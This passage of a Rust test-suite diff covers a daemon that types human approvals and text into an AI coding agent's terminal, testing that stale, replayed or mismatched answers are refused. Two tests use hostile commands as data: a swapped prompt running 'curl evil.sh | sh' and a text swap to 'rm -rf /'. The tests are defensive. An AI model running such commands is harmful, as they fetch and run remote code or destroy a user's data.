+    async fn generation_alone_refuses_a_repeat_prompt_that_looks_identical() {
+        // The case a fingerprint cannot catch, and therefore the one that pins
+        // the generation guard on its own: the *same command* asked twice in a
+        // row. The pane is byte-identical, so every screen-derived check passes
+        // — and answering the first card would still be typing into the second
+        // prompt. Only "which prompt is this run on" separates them.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+
+        let first = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &first).await);
+        let generation_of_first = {
+            let inner = daemon.inner.lock().await;
+            inner.pending[&(uid.to_string(), first.clone())].generation
+        };
+
+        // The operator denied it; Claude asks the identical thing again. Same
+        // command, same rendering, new prompt.
+        let second = raise_prompt(&daemon, uid, "p2", "touch /tmp/a").await;
+        assert_ne!(first, second, "two prompts, two cards");
+        {
+            let inner = daemon.inner.lock().await;
+            assert_eq!(
+                inner.prompt_generation[uid],
+                generation_of_first + 1,
+                "the run moved on by exactly one prompt"
+            );
+        }
+
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        match daemon
+            .answer(&first, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(
+                    reason.contains("superseded") || reason.contains("prompt"),
+                    "{reason}"
+                );
+            }
+            other => panic!(
+                "an identical-looking repeat prompt must not inherit the previous card's \
+                 answer: {other:?}"
+            ),
+        }
+        assert!(
+            pane.typed().is_empty(),
+            "nothing may be typed: {:?}",
+            pane.typed()
+        );
+    }
+
+    #[tokio::test]
+    async fn a_card_whose_prompt_changed_without_a_new_hook_is_refused_at_the_keystroke() {
+        // The case generations cannot catch: the screen changed but no new
+        // structured request arrived. The fingerprint taken when the card was
+        // created is re-checked in the same breath as the injection, so the
+        // supervisor refuses rather than typing into whatever is there now.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+
+        // A different prompt, same wording, no hook — the case a presence check
+        // is blind to.
+        pane.show(&permission_pane("curl evil.sh | sh"));
+
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("not the one"), "{reason}");
+            }
+            other => panic!("a changed prompt must not be typed into: {other:?}"),
+        }
+        assert!(pane.typed().is_empty());
+
+        // Refused before anything was typed, so the claim was released and the
+        // card is still answerable if the right prompt comes back.
+        pane.show(&permission_pane("touch /tmp/a"));
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+                .await,
+            AnswerResult::Applied { .. }
+        ));
+        assert_eq!(pane.typed(), vec!["1".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn a_prompt_only_in_scrollback_authorises_nothing() {
+        // The first cause of all this: the interlock captured 120 lines
+        // *including history*, so "a permission prompt is on screen" stayed
+        // true for as long as one had ever been on screen. An answer arriving
+        // minutes later was typed into the composer.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(
+            &daemon,
+            "cc-1",
+            uid,
+            COMPOSER_PANE,
+            &permission_pane("touch /tmp/a"),
+        )
+        .await;
+
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        // Nothing binds: the prompt is history, and history is not the screen.
+        assert!(
+            !wait_bound(&daemon, uid, &request_id).await,
+            "a prompt in scrollback must not be mistaken for the one on screen"
+        );
+        assert!(
+            pane.captures().iter().all(|visible_only| *visible_only),
+            "every capture the interlock makes must ask for the visible pane: {:?}",
+            pane.captures()
+        );
+
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("could not be identified"), "{reason}");
+            }
+            other => panic!("an unidentifiable prompt must not be answered: {other:?}"),
+        }
+        assert!(pane.typed().is_empty(), "{:?}", pane.typed());
+    }
+
+    #[tokio::test]
+    async fn a_supervisor_that_cannot_check_identity_is_never_asked_to_type_an_approval() {
+        // A supervisor from before minor 3 accepts the fingerprint field and
+        // silently drops it, so an approval sent through one would look checked
+        // and be unchecked. The rule is simple: fail toward the human.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach_speaking(
+            &daemon,
+            "cc-1",
+            uid,
+            &permission_pane("touch /tmp/a"),
+            "",
+            2,
+        )
+        .await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("predates prompt identity"), "{reason}");
+            }
+            other => panic!("an unverifiable supervisor must not be typed through: {other:?}"),
+        }
+        assert!(pane.typed().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_superseded_card_stops_asking_and_is_recorded_as_superseded() {
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let first = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![first.clone()]
+        );
+
+        pane.show(&permission_pane("touch /tmp/b"));
+        let second = raise_prompt(&daemon, uid, "p2", "touch /tmp/b").await;
+
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![second],
+            "only the current prompt may still be asking"
+        );
+        let (_, outcome) = daemon.store.get_answer(uid, &first).unwrap().unwrap();
+        assert_eq!(outcome.resolved_by, ResolvedBy::Superseded);
+        assert!(outcome.inferred, "nobody observed an answer to this one");
+        assert!(pane.typed().is_empty());
+    }
+
+    // =================================================== ordering and publish
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+    async fn append_and_publish_are_serialised_per_run() {
+        // Assigning a seq and publishing it are two steps, and without a gate
+        // around *both* a task holding seq 1 can be overtaken by one holding
+        // seq 2 — after which the socket has seen 2 and can never accept 1.
+        // The gate is what makes "the order they were numbered" and "the order
+        // they were sent" the same sentence.
+        //
+        // Held from the outside here, which is the only way to assert its
+        // existence rather than its luck: while the gate is held, an ingest for
+        // that run must not be able to complete.
+        let daemon = test_daemon();
+        let key = test_key();
+        let gate = daemon.publish_gate(&key.uid).await;
+        let held = gate.lock().await;
+
+        let ingest = {
+            let daemon = Arc::clone(&daemon);
+            let key = key.clone();
+            tokio::spawn(async move {
+                daemon
+                    .ingest(
+                        PendingEvent::new(&key, EventKind::ToolCall, json!({}), Source::Hook)
+                            .with_source_event_id("blocked"),
+                    )
+                    .await
+            })
+        };
+        tokio::time::sleep(Duration::from_millis(80)).await;
+        assert!(
+            !ingest.is_finished(),
+            "an ingest must not be able to number or publish an event while the run's \
+             gate is held"
+        );
+        assert_eq!(
+            daemon.store.max_seq(&key.uid).unwrap(),
+            0,
+            "and it must not have reached the store either"
+        );
+
+        drop(held);
+        assert!(ingest.await.unwrap().unwrap().is_some());
+        assert_eq!(daemon.store.max_seq(&key.uid).unwrap(), 1);
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 8)]
+    async fn concurrent_ingests_reach_a_subscriber_in_sequence_order() {
+        // The property the gate buys, under the load that used to break it.
+        // Every subscriber must see 1, 2, 3 … with no reordering, because a
+        // socket that receives a higher seq first has no way to accept the
+        // lower one afterwards.
+        let daemon = test_daemon();
+        let key = test_key();
+        let mut events = daemon.events_tx.subscribe();
+
+        let mut tasks = Vec::new();
+        for i in 0..64u32 {
+            let daemon = Arc::clone(&daemon);
+            let key = key.clone();
+            tasks.push(tokio::spawn(async move {
+                daemon
+                    .ingest(
+                        PendingEvent::new(&key, EventKind::ToolCall, json!({"i": i}), Source::Hook)
+                            .with_source_event_id(format!("e{i}")),
+                    )
+                    .await
+            }));
+        }
+        for task in tasks {
+            task.await.unwrap().unwrap();
+        }
+
+        let mut seen = Vec::new();
+        while let Ok(event) = events.try_recv() {
+            seen.push(event.seq);
+        }
+        assert_eq!(
+            seen,
+            (1..=64u64).collect::<Vec<_>>(),
+            "published order must be assignment order"
+        );
+    }
+
+    // =========================================== durable pending + two-phase
+
+    #[tokio::test]
+    async fn an_open_card_survives_a_restart_and_is_rebound_against_the_screen() {
+        // Pending approvals were memory-only, so a restart answered "unknown or
+        // already-resolved request" to a tap on a card that was still on the
+        // screen in front of the human. It is a durable fact in the log; the
+        // projection now survives with it.
+        let store = shared_store();
+        let uid = TEST_UID;
+        {
+            let daemon = daemon_on(Arc::clone(&store), Config::default());
+            let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+            let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+            assert!(wait_bound(&daemon, uid, &request_id).await);
+            drop(pane);
+        } // ccd is killed here
+
+        let daemon = daemon_on(
+            Arc::clone(&store),
+            Config {
+                local_resolve_grace_ms: 1,
+                ..Config::default()
+            },
+        );
+        daemon.recover().await;
+        let request_id = format!(
+            "pr-p1-{}",
+            &protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}))
+                [..16]
+        );
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![request_id.clone()],
+            "the card must still be asking after a restart"
+        );
+
+        // Recovered without an identity: this process never saw the screen the
+        // card was created against, so it may not act on it yet.
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("could not be identified"), "{reason}");
+            }
+            other => panic!("a recovered card must not act on an unverified screen: {other:?}"),
+        }
+        assert!(pane.typed().is_empty());
+
+        // …and is rebound against what is actually visible, at which point it
+        // becomes answerable again.
+        tokio::time::sleep(Duration::from_millis(5)).await;
+        daemon.sweep_local_resolutions().await;
+        assert!(
+            wait_bound(&daemon, uid, &request_id).await,
+            "the sweep must re-establish identity against the current prompt"
+        );
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+                .await,
+            AnswerResult::Applied { .. }
+        ));
+        assert_eq!(pane.typed(), vec!["1".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn an_answer_interrupted_mid_injection_is_never_typed_again() {
+        // The two-phase claim. Actuation used to precede the durable ledger, so
+        // a daemon killed between typing and recording came back with no record
+        // that anything had been attempted — and the next tap typed the answer
+        // into the agent a second time.
+        let store = shared_store();
+        let uid = TEST_UID;
+        let request_id = "toolu_interrupted";
+        let payload_hash = "hash-of-the-card";
+
+        // Exactly what a kill between the two writes leaves behind.
+        store
+            .claim_answer(&AnswerClaim {
+                session_uid: uid.to_string(),
+                session_id: "cc-1".to_string(),
+                request_id: request_id.to_string(),
+                payload_hash: payload_hash.to_string(),
+                decision: serde_json::to_string(&AnswerDecision::Allow).unwrap(),
+                started_at: protocol::time::now_rfc3339(),
+            })
+            .unwrap();
+        assert!(store.get_answer(uid, request_id).unwrap().is_none());
+
+        let daemon = daemon_on(Arc::clone(&store), Config::default());
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        daemon.recover().await;
+
+        // Recovery turns it into a terminal outcome that says what is true: the
+        // decision is known, whether it landed is not.
+        let (_, outcome) = store.get_answer(uid, request_id).unwrap().unwrap();
+        assert!(
+            outcome.indeterminate,
+            "the outcome must not claim to be settled"
+        );
+        assert!(!outcome.inferred, "the *decision* was never in doubt");
+        assert_eq!(outcome.decision, AnswerDecision::Allow);
+        assert!(store.answer_claim(uid, request_id).unwrap().is_none());
+
+        // And the retry replays that, rather than re-injecting.
+        match daemon
+            .answer(request_id, payload_hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Duplicate { outcome, .. } => assert!(outcome.indeterminate),
+            other => panic!("a retry must not re-apply an interrupted answer: {other:?}"),
+        }
+        assert!(
+            pane.typed().is_empty(),
+            "nothing may be typed a second time: {:?}",
+            pane.typed()
+        );
+    }
+
+    #[tokio::test]
+    async fn a_successful_answer_leaves_no_claim_behind_and_a_refused_one_releases_it() {
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+
+        // Refused before anything is typed: the claim must not survive, or the
+        // card would be permanently unanswerable for a keystroke never sent.
+        pane.show(COMPOSER_PANE);
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+                .await,
+            AnswerResult::Rejected { .. }
+        ));
+        assert!(
+            daemon
+                .store
+                .answer_claim(uid, &request_id)
+                .unwrap()
+                .is_none(),
+            "a refusal types nothing, so it must leave nothing claimed"
+        );
+
+        // Applied: the claim and the outcome settle in one transaction.
+        pane.show(&permission_pane("touch /tmp/a"));
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+                .await,
+            AnswerResult::Applied { .. }
+        ));
+        assert!(daemon
+            .store
+            .answer_claim(uid, &request_id)
+            .unwrap()
+            .is_none());
+        assert!(daemon.store.get_answer(uid, &request_id).unwrap().is_some());
+        // The durable projection goes with it, so a restart does not resurrect
+        // a card that has been answered.
+        assert!(daemon.store.list_pending_approvals().unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_duplicate_permission_hook_never_resurrects_a_resolved_card() {
+        // `ingest`'s duplicate result was computed and thrown away, then a
+        // pending entry was inserted unconditionally — so a hook redelivered
+        // after the card had been answered put a phantom block back on the
+        // session that nothing could ever resolve.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+                .await,
+            AnswerResult::Applied { .. }
+        ));
+        assert!(daemon.sessions().await.unwrap()[0].blocked_on.is_empty());
+        let seq_after_answer = daemon.store.max_seq(uid).unwrap();
+
+        // The same hook again — a shell wrapper retry, a redelivery, a rescan.
+        let same = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert_eq!(same, request_id);
+        assert!(
+            daemon.sessions().await.unwrap()[0].blocked_on.is_empty(),
+            "a replayed hook must not put an answered card back on the session"
+        );
+        assert_eq!(
+            daemon.store.max_seq(uid).unwrap(),
+            seq_after_answer,
+            "and it must not burn a sequence number either"
+        );
+        assert_eq!(pane.typed(), vec!["1".to_string()], "typed exactly once");
+    }
+
+    #[tokio::test]
+    async fn a_duplicate_hook_does_not_advance_the_prompt_generation() {
+        // A generation that moved on a replay would make the *live* card behind
+        // the run and refuse the answer to a prompt that is still on screen —
+        // the same defect wearing different clothes.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+
+        for _ in 0..3 {
+            raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        }
+        {
+            let inner = daemon.inner.lock().await;
+            assert_eq!(
+                inner.prompt_generation[uid], 1,
+                "one prompt, one generation"
+            );
+            assert_eq!(inner.pending.len(), 1);
+        }
+
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+                .await,
+            AnswerResult::Applied { .. }
+        ));
+        assert_eq!(pane.typed(), vec!["1".to_string()]);
+    }
+
+    // ===================================================== payload truncation
+
+    #[tokio::test]
+    async fn an_oversized_payload_is_cut_on_a_character_boundary() {
+        // `String::truncate` panics on a non-boundary byte, and a tool response
+        // is exactly the payload that carries multi-byte text — a path with an
+        // accent, a diff with an emoji. The cap was also being reported *after*
+        // the cut, so the recorded original size was the truncated one.
+        let daemon = daemon_with(Config {
+            max_payload_bytes: 4096,
+            ..Config::default()
+        });
+        // Emoji are four bytes each, so the cap lands mid-character for three
+        // of every four possible caps; this one is chosen to land inside one.
+        let text = "🔥".repeat(4096);
+        let mut pending = PendingEvent::new(
+            &test_key(),
+            EventKind::ToolResult,
+            json!({ "stdout": text }),
+            Source::Hook,
+        );
+        let original = pending.payload.to_string().len();
+        assert!(original > 4096);
+
+        daemon.truncate_payload(&mut pending);
+
+        assert_eq!(pending.payload["_codeconnect_truncated"], true);
+        assert_eq!(
+            pending.payload["_original_bytes"].as_u64().unwrap() as usize,
+            original,
+            "the recorded original size must be the size before the cut"
+        );
+        let preview = pending.payload["_preview"].as_str().unwrap();
+        assert!(preview.len() <= 4096);
+        assert!(
+            preview.len() > 4096 - 4,
+            "the cut must land on the nearest boundary, not far short of it"
+        );
+        // It survives the round trip an event has to make.
+        let encoded = serde_json::to_string(&pending.payload).unwrap();
+        let _: serde_json::Value = serde_json::from_str(&encoded).unwrap();
+    }
+
+    #[tokio::test]
+    async fn a_payload_under_the_cap_is_untouched() {
+        let daemon = test_daemon();
+        let mut pending = PendingEvent::new(
+            &test_key(),
+            EventKind::ToolResult,
+            json!({"stdout": "ok"}),
+            Source::Hook,
+        );
+        let before = pending.payload.clone();
+        daemon.truncate_payload(&mut pending);
+        assert_eq!(pending.payload, before);
+    }
+
+    // ========================================================== send_text
+
+    #[tokio::test]
+    async fn send_text_with_an_identity_types_once_however_often_it_is_retried() {
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+        let text = "reply with exactly: ok";
+        let hash = protocol::hash::send_text_hash(uid, text, true);
+
+        let first = daemon
+            .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+            .await;
+        assert!(matches!(first, SendTextResult::Sent { .. }), "{first:?}");
+
+        for _ in 0..4 {
+            match daemon
+                .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+                .await
+            {
+                SendTextResult::Duplicate { .. } => {}
+                other => panic!("a retry must replay, not retype: {other:?}"),
+            }
+        }
+        assert_eq!(
+            pane.typed(),
+            vec![text.to_string()],
+            "a takeover retried five times must reach the TTY once"
+        );
+    }
+
+    #[tokio::test]
+    async fn send_text_refuses_an_identity_that_does_not_match_its_own_text() {
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+        let honest = protocol::hash::send_text_hash(uid, "deploy to prod", true);
+
+        // A hash for different text: a captured frame replayed with new content
+        // under an id the ledger already trusts.
+        let swapped = daemon
+            .send_text(
+                uid,
+                "rm -rf /".to_string(),
+                Some("st-1"),
+                Some(&honest),
+                true,
+            )
+            .await;
+        assert!(
+            matches!(&swapped, SendTextResult::Refused { reason } if reason.contains("payload_hash")),
+            "{swapped:?}"
+        );
+
+        // An id with no hash cannot say what it is a retry *of*.
+        let unbound = daemon
+            .send_text(uid, "hi".to_string(), Some("st-2"), None, true)
+            .await;
+        assert!(
+            matches!(unbound, SendTextResult::Refused { .. }),
+            "{unbound:?}"
+        );
+
+        // The same id later carrying different material is a conflict, not a
+        // licence to type something else.
+        let ok = protocol::hash::send_text_hash(uid, "one", true);
+        assert!(matches!(
+            daemon
+                .send_text(uid, "one".into(), Some("st-3"), Some(&ok), true)
+                .await,
+            SendTextResult::Sent { .. }
+        ));
+        let other = protocol::hash::send_text_hash(uid, "two", true);
+        let conflict = daemon
+            .send_text(uid, "two".into(), Some("st-3"), Some(&other), true)
+            .await;
+        assert!(
+            matches!(&conflict, SendTextResult::Refused { reason } if reason.contains("already used")),
+            "{conflict:?}"
+        );
+        assert_eq!(pane.typed(), vec!["one".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn send_text_is_bounded_and_the_server_picks_the_interlock() {
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+
+        let huge = "x".repeat(protocol::ws::MAX_SEND_TEXT_BYTES + 1);
+        let refused = daemon.send_text(uid, huge, None, None, true).await;
+        assert!(
+            matches!(&refused, SendTextResult::Refused { reason } if reason.contains("ceiling")),
+            "{refused:?}"
+        );
+        assert!(pane.typed().is_empty());
+
+        // The interlock is the composer, chosen here and not offered by the
+        // caller — `Daemon::send_text` has no parameter for it at all, which is
+        // the point: the client used to nominate the needle that authorised its
+        // own keystrokes.
+        assert!(matches!(
+            daemon.send_text(uid, "hello".into(), None, None, true).await,
+            SendTextResult::Sent { matched } if matched == "foragents" || matched == "forshortcuts"
+        ));
+
+        // And with a permission prompt up, the composer is not ready, so free
+        // text is refused rather than typed into the prompt.
+        pane.show(&permission_pane("touch /tmp/a"));
+        let blocked = daemon
+            .send_text(uid, "hello".into(), None, None, true)
+            .await;
+        assert!(
+            matches!(blocked, SendTextResult::Refused { .. }),
+            "{blocked:?}"
+        );
+        assert_eq!(pane.typed(), vec!["hello".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn a_send_text_interrupted_mid_injection_is_never_typed_again() {
+        let store = shared_store();
+        let uid = TEST_UID;
+        let text = "deploy";
+        let hash = protocol::hash::send_text_hash(uid, text, true);
+
+        // A claim from a process that did not come back.
+        assert_eq!(
+            store
+                .claim_text_mutation(uid, "st-1", &hash, &protocol::time::now_rfc3339())
+                .unwrap(),
+            TextClaim::Claimed
+        );
+
+        let daemon = daemon_on(Arc::clone(&store), Config::default());
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+        daemon.recover().await;
+
+        let result = daemon
+            .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+            .await;
+        assert!(
+            matches!(result, SendTextResult::Indeterminate { .. }),
+            "an interrupted takeover must be reported, not repeated: {result:?}"
+        );
+        assert!(pane.typed().is_empty());
+    }
+
+    #[tokio::test]
+    async fn an_injection_the_supervisor_never_confirms_is_not_retried() {
+        // The case a two-outcome result type cannot express. The supervisor
+        // typed and then stopped answering — a timeout, a lost socket, a
+        // machine under load. "Refused" and "we never found out" are the same
+        // error to a caller with only success and failure, and treating this
+        // one as a refusal releases the claim and lets the next tap type "1"
+        // into a prompt that has already been answered.
+        let daemon = daemon_with(Config {
+            supervisor_timeout_ms: 100,
+            ..Config::default()
+        });
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+
+        pane.go_silent();
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Duplicate { outcome, .. } => {
+                assert!(
+                    outcome.indeterminate,
+                    "an unconfirmed injection must be recorded as unknown: {outcome:?}"
+                );
+            }
+            other => panic!("an unconfirmed injection must settle, not vanish: {other:?}"),
+        }
+
+        // The card is gone and the ledger is terminal, so a retry replays the
+        // unknown rather than being applied to a live TTY a second time.
+        assert!(daemon.sessions().await.unwrap()[0].blocked_on.is_empty());
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Duplicate { outcome, .. } => assert!(outcome.indeterminate),
+            other => panic!("a retry must not re-inject: {other:?}"),
+        }
+        assert!(
+            daemon
+                .store
+                .answer_claim(uid, &request_id)
+                .unwrap()
+                .is_none(),
+            "the claim is settled, not left dangling"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_request_that_is_never_answered_leaves_nothing_in_the_inflight_map() {
+        // The leak: the in-flight map was pruned only by an arriving *response*.
+        // Every timed-out request therefore left a `oneshot::Sender` behind
+        // permanently, on a map that lives as long as the supervisor's session
+        // — an unbounded growth on the stall path, which is the path that fires
+        // exactly when the daemon is already struggling. Nothing anywhere would
+        // ever have collected them.
+        let daemon = daemon_with(Config {
+            supervisor_timeout_ms: 50,
+            ..Config::default()
+        });
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        assert_eq!(pane.inflight_len(), 0);
+
+        pane.go_silent();
+        for _ in 0..5 {
+            let _ = daemon
+                .send_text("cc-1", "hello".into(), None, None, false)
+                .await;
+        }
+        assert_eq!(
+            pane.inflight_len(),
+            0,
+            "five abandoned requests left {} entries behind",
+            pane.inflight_len()
+        );
+    }
+
+    #[tokio::test]
+    async fn a_supervisor_that_stopped_reading_is_reported_as_not_sent() {
+        // The write queue is bounded now, so a supervisor whose process is
+        // stopped fills it. That must read as `NotSent` — the frame never left
+        // this process, so nothing can have been typed and a retry is safe —
+        // and it must not block the caller waiting for room.
+        let daemon = daemon_with(Config {
+            supervisor_timeout_ms: 50,
+            ..Config::default()
+        });
+        let uid = TEST_UID;
+        // Registered with a receiver that is dropped immediately: a closed
+        // channel is the strongest form of "not reading", and both refusals
+        // (full and closed) take the same branch.
+        let (tx, rx) = mpsc::channel(1);
+        drop(rx);
+        let _registration = daemon
+            .register_supervisor(
+                RegisterSession {
+                    session_id: "cc-1".into(),
+                    session_uid: Some(uid.into()),
+                    tmux_session: "cc-1".into(),
+                    tmux_socket: protocol::TMUX_SOCKET_NAME.into(),
+                    cwd: "/tmp".into(),
+                    supervisor_pid: 4242,
+                    claude_bin: None,
+                    started_at: protocol::time::now_rfc3339(),
+                    protocol_minor: protocol::PROTOCOL_MINOR,
+                },
+                tx,
+                Arc::new(std::sync::Mutex::new(HashMap::new())),
+            )
+            .await
+            .unwrap();
+
+        let started = std::time::Instant::now();
+        let result = daemon.capture("cc-1", 40).await;
+        assert!(result.is_err(), "a capture nobody can receive must fail");
+        assert!(
+            started.elapsed() < Duration::from_millis(500),
+            "it must fail fast rather than wait on a queue that will never drain"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_send_text_the_supervisor_never_confirms_stays_claimed() {
+        let daemon = daemon_with(Config {
+            supervisor_timeout_ms: 100,
+            ..Config::default()
+        });
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+        let text = "deploy";
+        let hash = protocol::hash::send_text_hash(uid, text, true);
+
+        pane.go_silent();
+        let first = daemon
+            .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+            .await;
+        assert!(
+            matches!(first, SendTextResult::Indeterminate { .. }),
+            "an unconfirmed takeover is unknown, not refused: {first:?}"
+        );
+
+        // Answering again — even with the supervisor healthy — must replay the
+        // unknown, because the first attempt may already have typed it.
+        let second = daemon
+            .send_text(uid, text.to_string(), Some("st-1"), Some(&hash), true)
+            .await;
+        assert!(
+            matches!(second, SendTextResult::Indeterminate { .. }),
+            "{second:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_request_that_never_reached_a_supervisor_is_a_refusal_not_an_unknown() {
+        // The precision that makes the previous test safe rather than merely
+        // cautious. "No supervisor attached" means the request never left this
+        // process, so nothing can have been typed — reporting *that* as unknown
+        // would strand a perfectly answerable card behind a permanent "we do
+        // not know", and a daemon that says it does not know when it does is
+        // the same defect as one that claims to know when it does not.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &request_id).await);
+        let hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+
+        // The supervisor goes away entirely — the tab was closed, the session
+        // ended, ccd has nothing to talk to.
+        daemon.unregister_supervisor(&pane._registration).await;
+
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("no supervisor"), "{reason}");
+            }
+            other => panic!("nothing was typed, so this is a refusal: {other:?}"),
+        }
+        assert!(
+            daemon
+                .store
+                .answer_claim(uid, &request_id)
+                .unwrap()
+                .is_none(),
+            "a refusal must release the claim so the card stays answerable"
+        );
+        assert!(daemon.store.get_answer(uid, &request_id).unwrap().is_none());
+        assert!(pane.typed().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_send_text_that_never_reached_a_supervisor_can_be_retried() {
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
+        let text = "deploy";
